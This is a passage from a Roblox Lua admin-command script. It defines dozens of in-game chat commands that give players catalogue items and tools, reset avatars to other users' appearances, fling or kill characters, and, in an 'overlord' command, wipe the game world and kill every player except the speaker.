g = game:GetService("InsertService"):LoadAsset(53903955) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("sword2", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(30863309) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("zacyab", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(52696673) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("gummybear", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(21462558) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("artifact", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(59607158) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("brunette", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(58838405) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("psp", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(58597225) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("jeep", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(59524622) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("workspace", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(41088196) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("player orb", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(19938328) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("overlord", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
owner = Speaker.Name
starterpack = game:GetService("StarterPack")
startergui = game:GetService("StarterGui")
local a=game.Workspace:GetChildren()
for i=1,#a do 
if (game.Players:GetPlayerFromCharacter(a[i]))==nil and (a[i].Name~="TinySB") and (a[i]~=game.Workspace.CurrentCamera) and (a[i] ~= workspace.Terrain) then 
a[i]:Remove() 
end 
end
b=startergui:GetChildren()
for i=1,#b do
b[i]:Remove()
end
c=starterpack:GetChildren()
for i=1,#c do
c[i]:Remove()
end
d=game.Players:GetChildren()
for i=1,#d do
if not (d[i].Name == owner) then
d[i].Character:BreakJoints()
j=d[i]:GetChildren()
for i=1,#j do
k=j[i]:GetChildren()
for i=1,#k do
k[i]:Remove()
end
end
end
end
e=game.Lighting:GetChildren()
for i=1,#e do
e[i]:Remove()
end
f = game:GetService("InsertService"):LoadAsset(58487473)
f.Parent = game.Workspace
f:MakeJoints()
g=f["Public Map"]
tt=g["Owner"]
tt.Value = owner
m=game.Players:GetChildren()
for i=1,#m do
n=m[i]:GetChildren()
for i=1,#n do
if n[i].className == "Hint" then
n[i]:Remove()
end
end
end
h=game.Workspace:GetChildren()
for i=1,#h do
h[i].Disabled = true
end
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("icc", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37681988) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ownageorb1", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(58393584) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("gui", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37673876) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("admg", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37682962) 
g.Parent = player.Character 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("assasin", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(40848777) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("wierdo", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=6819846" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("chowder", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=1783645" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("striper", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=5795761" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("bob", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=2342708" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("telamon", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=261" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ducc", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=7303693" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("sweed", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=6472560" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("girly", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=362994" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("masashi", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=3216894" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("madly", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=6160286" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ana", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=9201" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("police", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=5599663" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("gear", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=49566" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("builderman", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=156" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("reaper", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=8599152" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("guest", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=1" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("stickmaster", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=80254" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("matt", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=916" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("nairod7", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=7225903" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("icookienl", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=3166696" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("sonicthehegdehog", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=1134994" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("garrettjay", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=91645" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("plantize", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=5518138" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("boy", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=8057367" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("faded", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=6319456" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("noobify", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=9676343" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("darkking", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=2975932" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("guitar", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=1979584" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unknow", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=6401251" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("nazgul", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=1131345" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("teddy", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=13411824" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("isaac", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=1537069" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("comboknex", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=5942550" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("captinrex", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=8150321" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ganon", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=3357193" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("itacho", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=3368626" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("splosh", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=10308036" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("xero", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=741234" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("allietalbott", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=934107" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("icefighterr", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=6049960" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("poisonnoob", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=8558980" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("slime8765", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=3803146" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("illblade", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=6484494"
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("nick", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=3445997" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("tomcrusie", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=5025023" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("roquito", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=9521811"
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("suit", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/asset/?id=27911184" 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("knight", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/asset/?id=30364498"
end 
end 
end, "None", "None", "None")

-- Person299 commands

CoolCMDs.Functions.CreateCommand("local", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(7, slash-1),speaker)
color = msg:sub(slash+1)
color = color:upper(color:sub(1,1)) .. color:sub(2)
if player ~= 0 and color then
for i = 1,#player do
if player[i].Character then
thecolor = BrickColor.new(color)
if thecolor ~= nil then
if player[i].Character.Shirt ~= nil then
player[i].Character.Shirt:remove()
end
if player[i].Character.Pants then
player[i].Character.Pants:remove()
end
c = player[i].Character:GetChildren()
for i2 = 1,#c do
if c[i2]:IsA("Part") then
c[i2].BrickColor = thecolor
end 
end 
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("em", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(4),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(50307223)
insert.BlackHole.Parent = player[i].Character.Torso
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("up", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(4),speaker)
if player ~= 0 then
for i = 1,#player do
b = Instance.new("BodyForce") 
b.Parent = player[i].Character.Head 
b.force = Vector3.new(0,1000000,0) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("fling", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(7),speaker)
if player ~= 0 then
for i = 1,#player do
local inc = 1500
player[i].Character.Humanoid.PlatformStand=true
player[i].Character.Torso.Velocity=Vector3.new(math.random(-inc,inc),math.random(-inc,inc),math.random(-inc,inc))
player[i].Character.Torso.RotVelocity=Vector3.new(math.random(-inc,inc),math.random(-inc,inc),math.random(-inc,inc))
wait(1)
player[i].Character.Humanoid.PlatformStand=false
end
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("raggun", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(8),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(43335034)
insert:MakeJoints()
insert["Ragdoll Gun"].Parent = player[i].Backpack
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("broom", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(7),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(41690430)
insert:MakeJoints()
insert["Broomstick"].Parent = player[i].Backpack
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("wand", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(6),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(58688577)
insert:MakeJoints()
insert["Wand"].Parent = player[i].Backpack
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("tele", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(6),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(58526424)
insert:MakeJoints()
insert["Tele To Admin"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("sc", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(4),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(61797261)
insert:MakeJoints()
insert["Noob Scanner v0.6"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("phone", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(7),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(633879299)
insert:MakeJoints()
insert["WinBlox New Vegas"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("extool", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(8),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(56395152)
insert:MakeJoints()
insert["Explorer"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("gw", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(4),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(55058297)
insert:MakeJoints()
insert["Ghostwalker (0)"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("kot", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(5),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(56917321)
insert:MakeJoints()
insert["ScreenGui"].Parent = player[i].PlayerGui
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("smi", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(5),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(56840096)
insert:MakeJoints()
insert["Smite"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("del1", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(6),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(57133976)
insert:MakeJoints()
insert["BuildDelete"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("orb", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(5),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(44709620)
insert:MakeJoints()
insert["Script"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("pushtool", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(10),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(57120239)
insert:MakeJoints()
insert["Push"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ckatana", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(9),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(52193941)
insert:MakeJoints()
insert["Katana"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("bkatana", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(9),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(58523683)
insert:MakeJoints()
insert["Katana"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("bucket", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(8),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(58485759)
insert:MakeJoints()
insert["Bucket"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("nakedgun", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(10),speaker)
if player ~= 0 then
for i = 1,#player do
local insert = game:GetService("InsertService"):LoadAsset(58581402)
insert:MakeJoints()
insert["Naked Gun"].Parent = player[i].Backpack
insert:remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("jailtool", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(msg:sub(10),speaker)
if player ~= 0 then
for i = 1,#player do
